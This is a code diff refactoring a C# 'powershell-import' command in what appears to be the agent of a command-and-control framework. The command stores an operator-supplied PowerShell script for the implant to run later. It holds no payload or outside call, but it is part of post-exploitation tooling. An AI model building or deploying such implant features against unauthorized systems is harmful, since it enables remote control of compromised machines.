@@ -1,25 +1,26 @@
 ﻿using Agent.Models;
+using Shared;
 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Agent.Commands
 {
     public class PowerShellImportCommand : AgentCommand
     {
-        public override string Name => "powershell-import";
-        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        public override CommandId Command => CommandId.PowershellImport;
+        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
         {
-            this.CheckFileDownloaded(task, context);
+            if (!task.HasParameter(ParameterId.File))
+            {
+                context.Error($"Script is mandatory!");
+                return;
+            }
 
-            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
-            var fileContent = file.GetFileContent();
-
-
-            Script = Encoding.UTF8.GetString(fileContent);
-            this.Notify(context, $"{task.FileName} Dowloaded and set ad Import script");
+            Script = task.GetParameter<string>(ParameterId.File);
         }
 
         public static string Script { get; set; }
